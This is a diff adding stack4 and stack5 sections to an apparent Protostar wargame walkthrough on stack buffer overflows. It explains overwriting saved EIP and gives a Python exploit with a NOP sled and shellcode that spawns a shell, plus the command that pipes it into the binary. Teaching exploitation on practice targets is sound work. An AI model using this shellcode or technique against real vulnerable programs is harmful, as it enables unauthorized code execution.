@@ -399,3 +399,67 @@ You can also use the *p* command.
 And that's it we have succesfully found out the address of win function.
 Now let's do the overflow.
 **A small note that the hex values don't correspond to any proper ascii characters. So we use python to create the string. So, here I used python 2 because I was facing some problem with python 3. So, if you have python 2 installed then you can run the ./protostar/stack3/stack3.sh file and then do as it will be directed by that file.**
+
+## Level 5 (./stack4)
+
+**Stack4 takes a look at overwriting saved EIP and standard buffer overflows.**
+So, actually when we switch to a new function then the address of the next instruction of the parent function is stored in the esp and tnen **ebp is pushed on top of esp** to keep **a reference where the esp is i.e *the return address is***. And then we can freely move the esp and create a stack frame and then when the function execution is done then we just move the **esp to (ebp+0x4)** and then move the eip to that address contained in the esp. And that's it we reach the parent function.
+Thus a function execution takes place.
+**This is also true for the main function because the main is also called by some other fucntion written by the compiler.**
+And this is the feature we take use of.
+So, if we overflow the buffer and set the value of the return address i.e (ebp+0x4) to the address of win function then our code will be redirected to that function. And that's it we have succesfully made it to the win function.
+**Imp. Note : We called the win function but we did'nt set the stack frame, return address, etc. So, after execution of the win function the eip will be moved to the (old esp+0c4+0x4) and obviously no proper instruction is present at that address so it will raise a segmentaion fault. But we have succesfully reached our destination so we don't care about the error later.**
+So, the python exploit is as follows :
+
+```python
+
+```
+
+Run it as:
+
+```bash
+
+python exploit.py | ./stack4
+
+```
+
+## Level 6 (./stack5)
+
+ So, in the previous challange we set the value of return address to be the address of **win** function but here we are having no such funciton. Rather here we will try to execute our own shell code.So instead of puttting address of any other function in (ebp+0x4) we can put the address of (esp+0x4) and then in the overflow payload we will add the shellcode after that address. So, the program will be redirected to the start of the shell code. So, now our payload looks like this : **padding+eip+shellcode**.
+ But if you are in different directory or change your environment variables sometime the address of esp may change thus resulting our exploit to fail as it would not be able to find our shellcode. For this reason we put some NOP(/x90) bytes after the eip and then add the shell code. And then in the eip we just redirect it to (esp+0x4+n) where n is some more value which we can adjust to fit the best.So, NOP code is basically a pass instruction. That is the eip will just flow through the NOPsled.
+ You can also add '\xCC'(itn3) at some palce. This is the breakpoint isntruction. So, the code execution pauses when it hit this instruction.
+ So, here I have used a shell code to just run a dash shell. You can get many other shell codes from [Shell-storm](http://shell-storm.org/shellcode/).
+ So here is the exploit code(exploit.py):
+
+ ```python
+
+import struct
+padding="A"*(80-4)
+#eip='\x10\xd7\xff\xff' #0xffffd710 #ffffd700
+eip=struct.pack("I", 0xffffd710+80) #0xffffd72e
+nopsled="\x90"*100
+breakpoint="\xCC"*4
+shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+print padding+eip+nopsled+shellcode
+
+ ```
+
+Ok so now if you run this like :
+
+```bash
+
+python exploit.py | ./stack5
+
+```
+
+Then you will see that nothing shows up. This is because the shell wants some input to run and when out exploits completes its print it quits and closes its pipe thus leaving the shell with no input and so the shell closes. So, overcome this problem we run the exploit and pipe its output to the stack5 then the stack5 process is converted to dash and now we pipe the cat command to the dash. It can be dome something like this:
+
+```bash
+
+(python exploit.py ; cat) | ./satck5
+
+```
+
+So, now the cat takes input from the stdin and pipes it to the dash which then process it and prints it in the stdout.
+
+**Note that you might get segmentation fault or illegal instruction error. For that you have eto play a bit with the eip value and the nopsled value.**
